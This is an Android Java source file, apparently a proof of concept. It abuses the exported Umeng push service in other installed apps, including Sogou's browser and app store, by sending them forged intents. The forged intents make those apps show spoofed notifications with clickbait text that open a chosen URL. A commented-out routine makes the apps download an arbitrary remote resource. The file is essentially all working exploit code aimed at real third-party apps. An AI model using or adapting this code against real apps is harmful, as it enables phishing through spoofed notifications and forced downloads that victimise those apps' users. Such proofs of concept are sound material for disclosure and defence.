package com.wq.test;

import android.app.Activity;
import android.app.Application;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Random;

public class MainActivity extends Activity {

    static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();

        //downloadResourceService("com.ss.android.essay.joke", "http://www.antiy.com/wp-content/themes/antiy/images/logo.png?t=img");
        //downloadResourceService("com.hipu.yidian", "http://www.antiy.com/wp-content/themes/antiy/images/logo.png?t=img");
        //downloadResourceService("sogou.mobile.explorer", "http://www.antiy.com/wp-content/themes/antiy/images/logo.png?t=img");
        //downloadResourceService("com.sogou.androidtool", "http://www.antiy.com/wp-content/themes/antiy/images/logo.png?t=img");

        showNotification("sogou.mobile.explorer");
        showNotification("com.sogou.androidtool");
        showNotification("com.umeng.message.example");
    }

    private void setText(String text) {
        TextView tv = findViewById(R.id.sample_text);
        tv.setText(tv.getText() + "\n" + text);
    }

    private Intent getUmengIntent(String packageName) {

        Intent intent = new Intent();
        intent.setClassName(packageName, "com.umeng.message.UmengIntentService");
        intent.setAction("org.agoo.android.intent.action.RECEIVE");

        intent.putExtra("id", String.valueOf(new Random().nextInt() >>> 1));
        intent.putExtra("message_source", "巍擎");
        intent.putExtra("report", "1"); //得填
        intent.putExtra("encrypted", "0"); //0是normal msg
        intent.putExtra("type", "");
        intent.putExtra("extData", "");
        intent.putExtra("oriData", "");

        return intent;
    }

    private void downloadResourceService(String packageName, String url) {

        Intent intent = getUmengIntent(packageName);

        try {
            JSONObject UmengDownloadResourceService_body_extra = new JSONObject();
            UmengDownloadResourceService_body_extra.put("img", url);

            JSONObject UmengDownloadResourceService_body = new JSONObject();
            UmengDownloadResourceService_body.put("OPERATIOIN", "1");
            UmengDownloadResourceService_body.put("msg_id", String.valueOf(new Random().nextInt() >>> 1));;
            UmengDownloadResourceService_body.put("display_type", "notificationpullapp");
            UmengDownloadResourceService_body.put("body", UmengDownloadResourceService_body_extra);

            JSONObject UmengIntentService_body_body = new JSONObject();
            UmengIntentService_body_body.put("pulled_service", "com.umeng.message.UmengDownloadResourceService");
            UmengIntentService_body_body.put("pulled_package", packageName);

            JSONObject UmengIntentService_body_extra = new JSONObject();
            UmengIntentService_body_extra.put("body", UmengDownloadResourceService_body);

            JSONObject UmengIntentService_body = new JSONObject();
            UmengIntentService_body.put("msg_id", "msg_id");
            UmengIntentService_body.put("display_type", "pullapp");
            UmengIntentService_body.put("body", UmengIntentService_body_body);
            UmengIntentService_body.put("extra", UmengIntentService_body_extra);

            intent.putExtra("body", UmengIntentService_body.toString());

        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }

        ComponentName componentName = startService(intent);

        if (componentName != null) {
            setText(componentName.getClassName());
        }
    }

    private void showNotification(String packageName) {

        Intent intent = getUmengIntent(packageName);

        try {
            // http://dev.umeng.com/push/android/api-doc#2_1_3
            // "go_app": 打开应用
            // "go_url": 跳转到URL
            // "go_activity": 打开特定的activity
            // "go_custom": 用户自定义内容。
            JSONObject UmengDownloadResourceService_body_extra = new JSONObject();
            UmengDownloadResourceService_body_extra.put("after_open", "go_url");
            UmengDownloadResourceService_body_extra.put("url", "https://www.avlsec.com/");
            UmengDownloadResourceService_body_extra.put("ticker", "震惊，99%的人不知道还有这么牛逼的公司"); // 必填 通知栏提示文字
            UmengDownloadResourceService_body_extra.put("title", "震惊，99%的人不知道还有这么牛逼的公司"); // 必填 通知标题
            UmengDownloadResourceService_body_extra.put("text", "点击查看详情"); // 必填 通知文字描述
            UmengDownloadResourceService_body_extra.put("img", "https://p.ssl.qhimg.com/t01b24fe817149d09bc.jpg");

            JSONObject UmengDownloadResourceService_body = new JSONObject();
            UmengDownloadResourceService_body.put("OPERATIOIN", "1");
            UmengDownloadResourceService_body.put("msg_id", String.valueOf(new Random().nextInt() >>> 1));
            UmengDownloadResourceService_body.put("display_type", "autoupdate");
            UmengDownloadResourceService_body.put("body", UmengDownloadResourceService_body_extra);

            JSONObject UmengIntentService_body_body = new JSONObject();
            UmengIntentService_body_body.put("pulled_service", "com.umeng.message.UmengDownloadResourceService");
            UmengIntentService_body_body.put("pulled_package", packageName);

            JSONObject UmengIntentService_body_extra = new JSONObject();
            UmengIntentService_body_extra.put("body", UmengDownloadResourceService_body);

            JSONObject UmengIntentService_body = new JSONObject();
            UmengIntentService_body.put("msg_id", "msg_id");
            UmengIntentService_body.put("display_type", "pullapp");
            UmengIntentService_body.put("body", UmengIntentService_body_body);
            UmengIntentService_body.put("extra", UmengIntentService_body_extra);

            intent.putExtra("body", UmengIntentService_body.toString());

        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }

        ComponentName componentName = startService(intent);

        if (componentName != null) {
            setText(componentName.getClassName());
        }
    }
}